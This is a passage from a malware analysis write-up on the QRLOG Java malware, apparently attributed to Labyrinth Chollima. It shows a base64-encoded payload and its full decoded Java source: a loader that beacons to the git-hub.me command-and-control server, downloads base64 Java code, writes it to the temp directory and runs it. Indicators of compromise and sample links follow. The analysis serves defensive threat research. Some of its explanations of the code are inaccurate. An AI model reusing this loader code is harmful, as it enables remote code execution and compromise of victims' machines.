          + "CAgfQogICAgCiAgICBwcml2YXRlIHN0YXRpYyBTdHJpbmcgZ2V0T3BlcmF0aW5nU3lzdGVtKCkgewogICAgICAgIFN0cmluZyBvcyA9IFN5c3RlbS5nZXRQcm9wZXJ0eSgib3M"
          + "ubmFtZSIpOwogICAgICAgIFN0cmluZyByZXN1bHQgPSBudWxsOwogICAgICAgIAogICAgICAgIGlmIChvcy5jb250YWlucygiV2luZG93cyIpKQogICAgICAgICAgICByZXN1b"
          + "HQgPSAiMCI7CiAgICAgICAgZWxzZSBpZiAob3MuY29udGFpbnMoIkxpbnV4IikpCiAgICAgICAgICAgIHJlc3VsdCA9ICIyIjsKICAgICAgICBlbHNlIGlmIChvcy5jb250YWl"
          + "ucygiTWFjIE9TIFgiKSkKICAgICAgICAgICAgcmVzdWx0ID0gIjEiOwogICAgICAgIHJldHVybiByZXN1bHQ7CiAgICB9CiAgICAKICAgIHByaXZhdGUgc3RhdGljIHZvaWQgc"
          + "2VuZFBPU1QoKSB0aHJvd3MgSU9FeGNlcHRpb24gewogICAgICAgIFN0cmluZyB1aWQgPSByYW5kR2VuKCk7CiAgICAgICAgU3RyaW5nQnVpbGRlciBkYXRhID0gbmV3IFN0cml"
          + "uZ0J1aWxkZXIoKTsKICAgICAgICBTdHJpbmcgc2VjX3BhdGggPSAiIjsKICAgICAgICBkYXRhLmFwcGVuZCgiR0lUSFVCX1JFUSIpOwogICAgICAgIGRhdGEuYXBwZW5kKHVpZ"
          + "Ck7CiAgICAgICAgZGF0YS5hcHBlbmQoIjIwMDAiKTsKICAgICAgICBkYXRhLmFwcGVuZChnZXRPcGVyYXRpbmdTeXN0ZW0oKSk7CiAgICAgICAgCiAgICAgICAgd2hpbGUgKHR"
          + "ydWUpCiAgICAgICAgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgaWYgKHNlY19wYXRoLmxlbmd0aCgpID4gMSkgewogICAgICAgICAgICAgICAgICAgIEZpb"
          + "GUgc2VjRmlsZSA9IG5ldyBGaWxlKHNlY19wYXRoKTsKICAgICAgICAgICAgICAgICAgICBpZiAoc2VjRmlsZS5leGlzdHMoKSkKICAgICAgICAgICAgICAgICAgICAgICAgU3l"
          + "zdGVtLmV4aXQoMCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIEh0dHBSZXF1ZXN0IHJlcXVlc3QgPSBIdHRwUmVxdWVzdC5uZ"
          + "XdCdWlsZGVyKCkKICAgICAgICAgICAgICAgICAgICAuaGVhZGVyKCJDb250ZW50LVR5cGUiLCAiYXBwbGljYXRpb24vanNvbjsgY2hhcnNldD11dGYtOCIpCiAgICAgICAgICA"
          + "gICAgICAgICAgLnZlcnNpb24oSHR0cENsaWVudC5WZXJzaW9uLkhUVFBfMV8xKQogICAgICAgICAgICAgICAgICAgIC51cmkoVVJJLmNyZWF0ZShQT1NUX1VSTCkpCiAgICAgI"
          + "CAgICAgICAgICAgICAgLlBPU1QoSHR0cFJlcXVlc3QuQm9keVB1Ymxpc2hlcnMub2ZTdHJpbmcoZGF0YS50b1N0cmluZygpKSkKICAgICAgICAgICAgICAgICAgICAuYnVpbGQ"
          + "oKTsKICAgICAgICAgICAgICAgIEh0dHBDbGllbnQgY2xpZW50ID0gSHR0cENsaWVudC5uZXdIdHRwQ2xpZW50KCk7CiAgICAgICAgICAgICAgICBIdHRwUmVzcG9uc2U8U3Rya"
          + "W5nPiByZXNwb25zZSA9IGNsaWVudC5zZW5kKHJlcXVlc3QsIEh0dHBSZXNwb25zZS5Cb2R5SGFuZGxlcnMub2ZTdHJpbmcoKSk7CiAgICAgICAgICAgICAgICBpZiAocmVzcG9"
          + "uc2Uuc3RhdHVzQ29kZSgpICE9IDIwMCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBUaHJlYWQuc2xlZXAoNTAwMCk7CiAgICAgICAgICAgICAgICAgI"
          + "CAgY29udGludWU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBTdHJpbmcgcmVzU3RyID0gcmVzcG9uc2UuYm9keSgpOwogICAgICAgICAgICAgICAgaWYgKCF"
          + "yZXNTdHIuc3RhcnRzV2l0aCgiR0lUSFVCX1JFUyIpKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFN5c3RlbS5vdXQucHJpbnRsbigiRGF0YSBFcnJvc"
          + "iIpOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGlmIChyZXNTdHIubGVuZ3RoKCkgPiAxMSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICA"
          + "gICAgICAgICBTdHJpbmcgZW5jX2RhdGEgPSByZXNTdHIuc3Vic3RyaW5nKDEwKTsKICAgICAgICAgICAgICAgICAgICBieXRlIFtdIGRlY19kYXRhID0gQmFzZTY0LmdldERlY"
          + "29kZXIoKS5kZWNvZGUoZW5jX2RhdGEpOwogICAgICAgICAgICAgICAgICAgIFN0cmluZyBvcmdfZmlsZSA9IG5ldyBTdHJpbmcoZGVjX2RhdGEsIFN0YW5kYXJkQ2hhcnNldHM"
          + "uVVRGXzgpOwogICAgICAgICAgICAgICAgICAgIFN0cmluZyBvcmdfcGF0aDsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpZiAoSW50ZWdlci5wY"
          + "XJzZUludChnZXRPcGVyYXRpbmdTeXN0ZW0oKSkgPT0gMCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIG9yZ19wYXRoID0gU3lzdGVtLmd"
          + "ldFByb3BlcnR5KCJqYXZhLmlvLnRtcGRpciIpICsgIlxccHJlZlRtcC5qYXZhIjsKICAgICAgICAgICAgICAgICAgICAgICAgc2VjX3BhdGggPSBTeXN0ZW0uZ2V0UHJvcGVyd"
          + "HkoImphdmEuaW8udG1wZGlyIikgKyAiXFxwLmRhdCI7CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgb3JnX3BhdGggPSBTeXN"
          + "0ZW0uZ2V0UHJvcGVydHkoImphdmEuaW8udG1wZGlyIikgKyAiL3ByZWZUbXAuamF2YSI7CiAgICAgICAgICAgICAgICAgICAgICAgIHNlY19wYXRoID0gU3lzdGVtLmdldFByb"
          + "3BlcnR5KCJqYXZhLmlvLnRtcGRpciIpICsgIi9wLmRhdCI7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIHRyeSAoRmlsZVdyaXRlciBmaWxlID0"
          + "gbmV3IEZpbGVXcml0ZXIob3JnX3BhdGgsIHRydWUpO0J1ZmZlcmVkV3JpdGVyIGJ1ZmZlciA9IG5ldyBCdWZmZXJlZFdyaXRlcihmaWxlKSkgewogICAgICAgICAgICAgICAgI"
          + "CAgICAgICBidWZmZXIud3JpdGUob3JnX2ZpbGUpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBTdHJpbmcgY21kbGluZSA9ICJqYXZhICIgKyB"
          + "vcmdfcGF0aCArICIgIiArIHVpZCArICIgIiArIFBPU1RfVVJMOwogICAgICAgICAgICAgICAgICAgIFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoY21kbGluZSk7CiAgICAgI"
          + "CAgICAgICAgICAgICAgVGhyZWFkLnNsZWVwKDMwMDApOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgVGhyZWFkLnNsZWVwKDUwMDApOwogICAgICAgICAgICB"
          + "9CiAgICAgICAgICAgIH0gY2F0Y2ggKEludGVycnVwdGVkRXhjZXB0aW9uIGV4KSB7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0K";
```

As it was commented, it is `base64` content which will be decoded and later written in a `.java` file located in a temporary directory.

Decoding the base64 content of this variable we get the following output, which is far from being a simple log file:
  
<details>
<summary>Java Code (112 lines)</summary>

```java
import java.io.IOException;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Random;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.lang.Thread;

public class QRLog {

    private static final String POST_URL = "https://www.git-hub.me/view.php";

    public static void main(String[] args) throws IOException{

        sendPOST();
    }

    private static String randGen() throws IOException {
        String strPool = "123456789";
        StringBuilder sb = new StringBuilder();
        Random rand = new Random();
        
        for (int i=0; i<8; i++){
            sb.append(strPool.charAt(rand.nextInt(strPool.length())));
        }
        
        return sb.toString();
    }
    
    private static String getOperatingSystem() {
        String os = System.getProperty("os.name");
        String result = null;
        
        if (os.contains("Windows"))
            result = "0";
        else if (os.contains("Linux"))
            result = "2";
        else if (os.contains("Mac OS X"))
            result = "1";
        return result;
    }
    
    private static void sendPOST() throws IOException {
        String uid = randGen();
        StringBuilder data = new StringBuilder();
        String sec_path = "";
        data.append("GITHUB_REQ");
        data.append(uid);
        data.append("2000");
        data.append(getOperatingSystem());
        
        while (true)
        {
            try {
                if (sec_path.length() > 1) {
                    File secFile = new File(sec_path);
                    if (secFile.exists())
                        System.exit(0);
                }
                
                HttpRequest request = HttpRequest.newBuilder()
                    .header("Content-Type", "application/json; charset=utf-8")
                    .version(HttpClient.Version.HTTP_1_1)
                    .uri(URI.create(POST_URL))
                    .POST(HttpRequest.BodyPublishers.ofString(data.toString()))
                    .build();
                HttpClient client = HttpClient.newHttpClient();
                HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
                if (response.statusCode() != 200)
                {
                    Thread.sleep(5000);
                    continue;
                }
                String resStr = response.body();
                if (!resStr.startsWith("GITHUB_RES"))
                {
                    System.out.println("Data Error");
                } else {
                if (resStr.length() > 11)
                {
                    String enc_data = resStr.substring(10);
                    byte [] dec_data = Base64.getDecoder().decode(enc_data);
                    String org_file = new String(dec_data, StandardCharsets.UTF_8);
                    String org_path;
                    
                    if (Integer.parseInt(getOperatingSystem()) == 0)
                    {
                        org_path = System.getProperty("java.io.tmpdir") + "\\prefTmp.java";
                        sec_path = System.getProperty("java.io.tmpdir") + "\\p.dat";
                    } else {
                        org_path = System.getProperty("java.io.tmpdir") + "/prefTmp.java";
                        sec_path = System.getProperty("java.io.tmpdir") + "/p.dat";
                    }
                    try (FileWriter file = new FileWriter(org_path, true);BufferedWriter buffer = new BufferedWriter(file)) {
                        buffer.write(org_file);
                    }
                    String cmdline = "java " + org_path + " " + uid + " " + POST_URL;
                    Runtime.getRuntime().exec(cmdline);
                    Thread.sleep(3000);
                }
                Thread.sleep(5000);
            }
            } catch (InterruptedException ex) {
            }
        }
    }
}
```

</details>

What does this code do?

- Multiple imports to grant the snippet ability to make HTTP connections, encode and decode Base64, manipulate files, throw random numbers and use threading

```java
import java.io.IOException;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Random;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.lang.Thread;
```

- Declares the malicious site git-hub.me/view.php, where a POST request will be sent soon.

```java
private static final String POST_URL = "https://www.git-hub.me/view.php";
```

- Declares a 8-character random string composed by numbers, which will be later used to create a temporary directory.

```java
private static String randGen() throws IOException {
  String strPool = "123456789";
  StringBuilder sb = new StringBuilder();
  Random rand = new Random();

  for (int i=0; i<8; i++){
      sb.append(strPool.charAt(rand.nextInt(strPool.length())));
  }

  return sb.toString();
}
```

- Identifies operating system in a basic way (just by platform name).

```java
private static String getOperatingSystem() {
  String os = System.getProperty("os.name");
  String result = null;

  if (os.contains("Windows"))
      result = "0";
  else if (os.contains("Linux"))
      result = "2";
  else if (os.contains("Mac OS X"))
      result = "1";
  return result;
}
```

- Crafts a POST request to git-hub.me containing a random generated uid and the identified OS, disguised as arguments from a legit-looking github query (using parameters as GITHUB_REQ).

```java
private static void sendPOST() throws IOException {
        String uid = randGen();
        StringBuilder data = new StringBuilder();
        String sec_path = "";
        data.append("GITHUB_REQ");
        data.append(uid);
        data.append("2000");
        data.append(getOperatingSystem());
```

- Checks for the existence of a flag file, indicating wether the attack was carried before on the infected machine. If the file is not present it will send the request as JSON and create said flag.

```java
try {
  if (sec_path.length() > 1) {
      File secFile = new File(sec_path);
      if (secFile.exists())
          System.exit(0);
  }

  HttpRequest request = HttpRequest.newBuilder()
      .header("Content-Type", "application/json; charset=utf-8")
      .version(HttpClient.Version.HTTP_1_1)
      .uri(URI.create(POST_URL))
      .POST(HttpRequest.BodyPublishers.ofString(data.toString()))
      .build();
  HttpClient client = HttpClient.newHttpClient();
  HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
```

- If the POST request is not well received (status 200), the code will sleep for 5 seconds. From now on all communications must come back labeled with “GITHUB_RES” indicating the C2 is the intended receiver of the message. Responses that come back without that pattern won’t be honored.

```java
if (response.statusCode() != 200)
{
  Thread.sleep(5000);
  continue;
}
String resStr = response.body();
if (!resStr.startsWith("GITHUB_RES"))
{
  System.out.println("Data Error");
} else {
```

- After the initial “dialogue” with the C2 and depending on the operating system used by the victim, malware will check if received response is longer than 11 chars. If so, it will take the first 10 and base64 decode them. Then those characters will be cast to UTF-8.

```java
if (resStr.length() > 11)
{
    String enc_data = resStr.substring(10);
    byte [] dec_data = Base64.getDecoder().decode(enc_data);
    String org_file = new String(dec_data, StandardCharsets.UTF_8);
    String org_path;
}

```

- Then the malware will drop two files on the temporary directory: p.dat and prefTmp.java. The later will receive the 10 characters decoded on the previous step.

```java
if (Integer.parseInt(getOperatingSystem()) == 0)
{
    org_path = System.getProperty("java.io.tmpdir") + "\\prefTmp.java";
    sec_path = System.getProperty("java.io.tmpdir") + "\\p.dat";
} else {
    org_path = System.getProperty("java.io.tmpdir") + "/prefTmp.java";
    sec_path = System.getProperty("java.io.tmpdir") + "/p.dat";
}
try (FileWriter file = new FileWriter(org_path, true);BufferedWriter buffer = new BufferedWriter(file)) {
    buffer.write(org_file);
}
```

- Then the command java $TEMP/prefTmp.java $UID https://www.git-hub.me/view.php is executed, acting as a reverse shell. 

```java
String cmdline = "java " + org_path + " " + uid + " " + POST_URL;
Runtime.getRuntime().exec(cmdline);
Thread.sleep(3000);
```

### Interesting details

- Having performed reverse engineering on the sample and understanding how it communicates with its C2 (Command and Control), I decided to send contact requests to it using my Telegram alias in an attempt to secure a brief interview with the group. Their response was a large-scale SSH Bruteforce attack against the IP address from which I had sent the requests. Since this system was actually a honeypot, it was possible to record all the offensive infrastructure they used in the operation and dump it into an intelligence pulse [[4]](#references). Plaintext version can be found [here](https://github.com/BirminghamCyberArms/QRLOG/blob/main/iocs/labyrinth_chollima_attack_infrastructure.csv).

- The `inputFiles.lst` file contains Maven build information. From it, it is possible to know that the author of the malware calls himself *Edward* and uses a Windows platform:
  
```bash
#[...]
[...]/default-compile/inputFiles.lst:275:C:\Users\Edward\Downloads\qr-code-generator-and-reader-master\qr-code-generator-and-reader-master\src\main\java\com\google\zxing\common\detector\MathUtils.java
[...]/default-compile/inputFiles.lst:276:C:\Users\Edward\Downloads\qr-code-generator-and-reader-master\qr-code-generator-and-reader-master\src\main\java\com\client\result\VEventResultParser.java
[...]/default-compile/inputFiles.lst:277:C:\Users\Edward\Downloads\qr-code-generator-and-reader-master\qr-code-generator-and-reader-master\src\main\java\com\google\zxing\oned\Code128Writer.java
#[...]
  ```

- This investigation was accepted as a Talk for the Recon Village at DEF CON 31 [[5]](#references).

<a name="indicators"></a>
## IOCs

- [OpenIOC version](https://github.com/birminghamcyberarms/QRLOG/blob/main/iocs/8cdccc15-5563-48bf-9493-7730aa19517c.ioc)
- Plaintext version (see below)
- [Labyrinth Chollima Adversary Infrastructure](https://github.com/BirminghamCyberArms/QRLOG/blob/main/iocs/labyrinth_chollima_attack_infrastructure.csv)

```
File:QRLog.java
File:prefTmp.java
File:QRCodeGenerator_Java.zip
File:AppleAccount.pdf
File:AppleAccountAgent
File:p.dat
IP:45.77.123.18
IP:3.90.35.35
URL:auth.pxaltonet.org
URL:www.git-hub.me
URI:/file/d/1J6943NKwGIcWHh7lj4o9gJe__9p7F1o7/view
MD5:0fb16054a1486b754d1fcc5c6b6e1b01
MD5:26b7d315dd19eb932a08fe474e0f0c31
```

<a name="samples"></a>
## Samples
- Original Sample
  - `https://drive.google.com/file/d/1J6943NKwGIcWHh7lj4o9gJe__9p7F1o7/view`
- Mirror
  - [sample.zip](https://github.com/birminghamcyberarms/QRLOG/blob/main/samples/sample.zip)
  - Password: _mauroeldritch_
- Malicious Java file
  - [QRCodeWriter.java](https://github.com/birminghamcyberarms/QRLOG/blob/main/samples/QRCodeWriter.java)

<a name="references"></a>
## References
1) [VirusTotal](https://www.virustotal.com/gui/url/da45ab04a24c4473acdecc8288fbaf3c200e82c32525b8378753f41eec3b5493/detection)
2) [AlienVault OTX](https://otx.alienvault.com/indicator/ip/45.77.123.18)
3) [AlienVault OTX Intelligence Pulse](https://otx.alienvault.com/pulse/63e50c46063dd5d3a5992804)
4) [AlienVault OTX Intelligence Pulse - Updated](https://otx.alienvault.com/pulse/64cfcc366fc8f13ce315f39a)
5) [DEF CON 31 - Recon Village Talk Announcement](https://reconvillage.org/recon-village-talks-2023-defcon-31/)
